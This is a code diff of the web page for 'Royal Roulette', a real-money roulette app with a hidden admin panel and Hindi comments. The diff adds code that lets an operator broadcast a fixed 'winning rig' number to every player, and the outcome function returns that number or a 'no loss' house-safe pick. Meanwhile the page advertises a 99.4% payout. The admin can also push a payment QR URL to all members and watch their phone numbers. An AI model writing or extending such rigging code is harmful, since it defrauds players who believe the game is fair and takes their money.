@@ -10,7 +10,7 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>ROYAL ROULETTE - WORLDWIDE GLOBAL MEMBER BROADCAST ENGINE</title>
+    <title>ROYAL ROULETTE - MASTER GLOBAL SYNC ENGINE</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; outline: none; -webkit-tap-highlight-color: transparent; }
         body { 
@@ -147,7 +147,7 @@
         .dep-pkg-btn.selected, .wd-pkg-btn.selected { background: #f1c40f; color: #000; box-shadow: 0 0 12px #f1c40f; }
         .wallet-modal-content input { width: 100%; padding: 10px; margin: 6px 0; background: #000; border: 1.5px solid #f1c40f; color: #f1c40f; border-radius: 6px; text-align: center; font-weight: bold; font-size: 13px; }
 
-        #mobileDebugConsole { position: fixed; bottom: 0; left: 0; width: 100%; max-height: 120px; background: rgba(0,0,0,0.95); border-top: 2px solid #00ffcc; color: #00ffcc; font-size: 9px; font-family: monospace; z-index: 999999; padding: 6px; text-align: left; overflow-y: auto; pointer-events: auto; }
+        #mobileDebugConsole { position: fixed; bottom: 0; left: 0; width: 100%; max-height: 110px; background: rgba(0,0,0,0.95); border-top: 2px solid #00ffcc; color: #00ffcc; font-size: 9px; font-family: monospace; z-index: 999999; padding: 6px; text-align: left; overflow-y: auto; pointer-events: auto; }
     </style>
 
     <!-- Google Firebase SDKs -->
@@ -156,10 +156,9 @@
 </head>
 <body>
 
-    <!-- Worldwide Active Members Monitor Console -->
     <div id="mobileDebugConsole">
-        <b>[WORLDWIDE BROADCAST TRACKER ACTIVE]</b><br>
-        <span id="consoleLogs">Connecting to global cloud channels...<br></span>
+        <b>[MASTER SYNC CONSOLE ACTIVE]</b><br>
+        <span id="consoleLogs">Connecting to Firebase Cloud...<br></span>
     </div>
     <script>
         function logToScreen(msg, isErr=false) {
@@ -180,11 +179,11 @@
     <script>
         (function() {
             try {
-                const BUILD_VER = "ROYAL_2026_WORLDWIDE_V7";
+                const BUILD_VER = "ROYAL_2026_FINAL_MASTER_V8";
                 if (localStorage.getItem("app_build_version") !== BUILD_VER) {
                     localStorage.clear();
                     localStorage.setItem("app_build_version", BUILD_VER);
-                    logToScreen("Cache wiped for fresh global handshake.");
+                    logToScreen("Cache wiped successfully.");
                 }
             } catch(e) {}
         })();
@@ -220,12 +219,12 @@
 
     <div id="loginScreenContainer">
         <div class="header-container">
-            <div class="trust-banner">WORLDWIDE MEMBER BROADCAST ENGINE • ⚡</div>
+            <div class="trust-banner">MASTER GLOBAL SYNC ENGINE • ⚡</div>
             <div class="royal-title-wrap">
                 <div class="royal-main-title">ROYAL ROULETTE</div>
             </div>
             <div class="live-stats-bar">
-                <span>🟢 GLOBAL BROADCAST: ACTIVE</span>
+                <span>🟢 GLOBAL LIVE: ACTIVE</span>
                 <span>🔒 CLOUD 2026</span>
                 <span>⚡ PAYOUT: 99.4%</span>
             </div>
@@ -363,14 +362,15 @@
     <div id="secretAdminModal">
         <div class="admin-dashboard-container">
             <div class="admin-top-header">
-                <h2>👑 WORLDWIDE BROADCAST ADMIN PANEL</h2>
+                <h2>👑 MASTER GLOBAL ADMIN PANEL</h2>
                 <button onclick="document.getElementById('secretAdminModal').style.display='none'" style="background: #e74c3c; color: #fff; border: none; padding: 6px 14px; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer;">✕ Close</button>
             </div>
 
+            <!-- QR URL INPUT BOX (सीधा लिंक डालने के लिए) -->
             <div style="background: rgba(0,30,15,0.95); padding: 12px; border: 2px solid #00ffcc; border-radius: 8px;">
-                <p style="color: #00ffcc; font-size: 12px; margin-bottom: 5px; font-weight: bold;">📱 INSTANT QR UPLOADER (WORLDWIDE BROADCAST)</p>
-                <input type="file" id="adminQrImageFile" accept="image/*" style="width: 100%; padding: 6px; background: #000; color: #fff; border: 1.5px solid #00ffcc; border-radius: 5px; font-size: 10px; margin-bottom: 6px;" />
-                <button onclick="window.uploadAndBroadcastAdminQr()" style="width: 100%; padding: 10px; background: linear-gradient(135deg, #27ae60, #1e8449); color: #fff; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; text-transform: uppercase; font-size: 11px;">Broadcast QR to All Online Members</button>
+                <p style="color: #00ffcc; font-size: 12px; margin-bottom: 5px; font-weight: bold;">📱 DIRECT QR IMAGE URL (GLOBAL SYNC)</p>
+                <input type="text" id="adminQrUrlInput" placeholder="Paste direct image URL (e.g. https://...)" style="width: 100%; padding: 8px; background: #000; color: #fff; border: 1.5px solid #00ffcc; border-radius: 5px; font-size: 11px; margin-bottom: 6px;" />
+                <button onclick="window.broadcastQrUrlDirect()" style="width: 100%; padding: 10px; background: linear-gradient(135deg, #27ae60, #1e8449); color: #fff; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; text-transform: uppercase; font-size: 11px;">Broadcast QR URL to All Members</button>
             </div>
 
             <div style="background: rgba(30,20,5,0.95); padding: 12px; border: 2px solid #ffaa00; border-radius: 8px;">
@@ -387,7 +387,6 @@
                 <div class="kpi-card blue"><div class="kpi-title">Real Pool (95%)</div><div class="kpi-value" id="admPool" style="color:#3498db;">₹0</div></div>
             </div>
 
-            <!-- WORLDWIDE ONLINE MEMBERS MONITOR (यहाँ दिखेंगे दुनिया भर के सारे मेंबर्स) -->
             <div class="admin-section-box" style="border: 2px solid #00ffcc;">
                 <div class="admin-section-title"><span style="color: #00ffcc;">🌐 Worldwide Online Members Live Monitor</span></div>
                 <div id="admWorldwideMembersList" style="max-height: 160px; overflow-y: auto; font-size: 10.5px; color: #fff; text-align: left;">
@@ -424,11 +423,11 @@
             </div>
 
             <div class="admin-section-box">
-                <div class="admin-section-title"><span>⚙️ Global Rig Override (Real Money Only)</span></div>
+                <div class="admin-section-title"><span>⚙️ Global Master Rig (For All Members)</span></div>
                 <select id="adminRigSelect" style="margin-bottom: 8px;">
                     <option value="random">Auto 5% House Margin Safe Engine (No Loss)</option>
                 </select>
-                <button onclick="saveAdminSettings()" class="login-btn" style="background:linear-gradient(135deg, #27ae60, #1e8449); color:#fff; padding:10px; font-size:12px;">Broadcast Rig to All Members</button>
+                <button onclick="saveAdminSettings()" class="login-btn" style="background:linear-gradient(135deg, #27ae60, #1e8449); color:#fff; padding:10px; font-size:12px;">Broadcast Winning Rig to All Members</button>
             </div>
         </div>
     </div>
@@ -515,16 +514,16 @@
         try {
             if (!firebase.apps.length) {
                 firebase.initializeApp(firebaseConfig);
-                logToScreen("Firebase Initialized for Worldwide Broadcast.");
+                logToScreen("Master Firebase Connected.");
             }
         } catch(e) {
             logToScreen("Init Error: " + e.message, true);
         }
 
-        const qrRef = firebase.database().ref("worldwide_admin_qr");
-        const rigRef = firebase.database().ref("worldwide_admin_rig");
-        const historyRef = firebase.database().ref("worldwide_history_list");
-        const membersPresenceRef = firebase.database().ref("worldwide_online_members");
+        const qrRef = firebase.database().ref("master_global_qr_url");
+        const rigRef = firebase.database().ref("master_global_rig_number");
+        const historyRef = firebase.database().ref("master_global_history");
+        const membersRef = firebase.database().ref("master_global_members");
 
         (function() {
             try {
@@ -547,13 +546,13 @@
                     onlineMembers: {}
                 };
 
-                // --- WORLDWIDE BROADCAST LISTENERS (सभी मेंबर्स के लिए लाइव) ---
+                // --- MASTER GLOBAL LISTENERS (सारे मेंबर्स के लिए अचूक सिंक) ---
                 qrRef.on("value", (snap) => {
                     let val = snap.val();
                     if (val) {
                         window.globalState.adminQrUrl = val;
                         updateActiveQrDisplay();
-                        logToScreen("[BROADCAST OK] New QR received from Cloud by this member.");
+                        logToScreen("[SYNC] QR URL updated globally.");
                     }
                 });
 
@@ -561,7 +560,7 @@
                     let val = snap.val();
                     if (val !== null) {
                         window.globalState.adminRig = val;
-                        logToScreen("[BROADCAST OK] New Rig command received from Cloud: " + val);
+                        logToScreen("[SYNC] Master Winning Rig synced -> " + val);
                     }
                 });
 
@@ -573,7 +572,7 @@
                     }
                 });
 
-                membersPresenceRef.on("value", (snap) => {
+                membersRef.on("value", (snap) => {
                     let val = snap.val() || {};
                     window.globalState.onlineMembers = val;
                     renderWorldwideMembersListUI();
@@ -581,15 +580,11 @@
 
                 function pingMyPresenceAsMember() {
                     try {
-                        let memberNodeKey = myUniqueSessionId;
-                        if (loggedUserPhone) memberNodeKey = loggedUserPhone.replace(/\./g, '_') + "_" + loggedVipId;
-                        
-                        membersPresenceRef.child(memberNodeKey).set({
-                            sessionId: myUniqueSessionId,
-                            phone: loggedUserPhone || "Guest/Player",
+                        let key = (loggedUserPhone ? loggedUserPhone.replace(/\./g, '_') : "Guest") + "_" + loggedVipId;
+                        membersRef.child(key).set({
+                            phone: loggedUserPhone || "Guest Player",
                             vipId: loggedVipId,
-                            lastSeen: new Date().toLocaleTimeString(),
-                            mode: activeGameMode
+                            lastSeen: new Date().toLocaleTimeString()
                         });
                     } catch(e) {}
                 }
@@ -599,12 +594,12 @@
                 function renderWorldwideMembersListUI() {
                     let listEl = document.getElementById('admWorldwideMembersList');
                     if (!listEl) return;
-                    let membersMap = window.globalState.onlineMembers;
-                    let keys = Object.keys(membersMap);
+                    let map = window.globalState.onlineMembers;
+                    let keys = Object.keys(map);
                     if (keys.length > 0) {
                         let html = "";
                         keys.forEach(k => {
-                            let m = membersMap[k];
+                            let m = map[k];
                             html += `<div style="background:rgba(0,0,0,0.8); border:1px solid #00ffcc; padding:6px; border-radius:5px; margin-bottom:4px;">
                                 🌐 Member: <b>${m.phone}</b> (${m.vipId}) | Last Seen: <span style="color:#ffd700;">${m.lastSeen}</span>
                             </div>`;
@@ -629,21 +624,16 @@
                     });
                 }
 
-                window.uploadAndBroadcastAdminQr = function() {
-                    let fileInput = document.getElementById('adminQrImageFile');
-                    if (!fileInput || !fileInput.files || fileInput.files.length === 0) { alert("Select QR Image!"); return; }
-                    let reader = new FileReader();
-                    reader.onload = function(e) {
-                        let base64Img = e.target.result;
-                        logToScreen("[ADMIN] Broadcasting QR to all worldwide members...");
-                        qrRef.set(base64Img).then(() => {
-                            alert("✅ QR Code Successfully Broadcasted to All Worldwide Members!");
-                            logToScreen("[SUCCESS] QR Broadcast sent to Cloud for all users.");
-                        }).catch(err => {
-                            logToScreen("[ERR] Broadcast failed: " + err.message, true);
-                        });
-                    };
-                    reader.readAsDataURL(fileInput.files[0]);
+                window.broadcastQrUrlDirect = function() {
+                    let urlInput = document.getElementById('adminQrUrlInput').value.trim();
+                    if (!urlInput) { alert("Enter valid Image URL!"); return; }
+                    logToScreen("[ADMIN] Broadcasting QR URL globally...");
+                    qrRef.set(urlInput).then(() => {
+                        alert("✅ QR URL Successfully Broadcasted to All Members!");
+                        logToScreen("[SUCCESS] QR URL pushed to Cloud.");
+                    }).catch(err => {
+                        logToScreen("[ERR] QR broadcast failed: " + err.message, true);
+                    });
                 };
 
                 function getOrCreateUniqueRoyalId(phone) {
@@ -668,6 +658,7 @@
                 }
 
                 function getSmartWinnerForRound(roundId) {
+                    // अब यह पूरे विश्व के सभी खिलाड़ियों के लिए एक ही मास्टर रिग नंबर पकड़ेगा
                     if (window.globalState.adminRig !== "random") {
                         let parsedNum = parseInt(window.globalState.adminRig);
                         if (!isNaN(parsedNum)) return parsedNum;
@@ -686,12 +677,6 @@
                     if (validSafeNumbers.length === 0) validSafeNumbers = [0, 32, 15, 19, 4, 21, 2];
 
                     let chosenWinner = validSafeNumbers[Math.abs((roundId * 397 + Math.floor(Date.now() / 1000)) % validSafeNumbers.length)];
-                    
-                    let profitEl = document.getElementById('admProfit');
-                    let poolEl = document.getElementById('admPool');
-                    if (profitEl) profitEl.innerText = "₹" + houseProfit.toFixed(1);
-                    if (poolEl) poolEl.innerText = "₹" + safePayoutPool.toFixed(1);
-
                     return chosenWinner;
                 }
 
@@ -814,15 +799,15 @@
 
                 const adminSelect = document.getElementById('adminRigSelect');
                 if(adminSelect) {
-                    numbersList.forEach(num => { let opt = document.createElement('option'); opt.value = num; opt.innerText = "Broadcast Rig Number " + num; adminSelect.appendChild(opt); });
+                    numbersList.forEach(num => { let opt = document.createElement('option'); opt.value = num; opt.innerText = "Broadcast Winning Number " + num; adminSelect.appendChild(opt); });
                 }
                 
                 window.saveAdminSettings = function() {
                     let sel = document.getElementById('adminRigSelect').value;
-                    logToScreen("[ADMIN] Broadcasting Rig command to all members...");
+                    logToScreen("[ADMIN] Broadcasting Winning Rig globally...");
                     rigRef.set(sel).then(() => {
-                        alert(`✅ Rig '${sel}' Broadcasted Successfully to All Members!`);
-                        logToScreen("[SUCCESS] Rig broadcast confirmed.");
+                        alert(`✅ Winning Rig '${sel}' Broadcasted to All Members!`);
+                        logToScreen("[SUCCESS] Master Rig broadcasted.");
                         document.getElementById('secretAdminModal').style.display = 'none';
                     }).catch(err => {
                         logToScreen("[ERR] Rig broadcast failed: " + err.message, true);
@@ -1017,6 +1002,7 @@
                     let spinAudio = document.getElementById('spinSfx');
                     if(spinAudio) spinAudio.play().catch(e => {});
 
+                    // यहाँ पूरी दुनिया के लिए एक ही मास्टर विनिंग नंबर सेट हो गया है
                     let winningNum = getSmartWinnerForRound(endedRoundId);
                     
                     let totalPockets = numbersList.length;
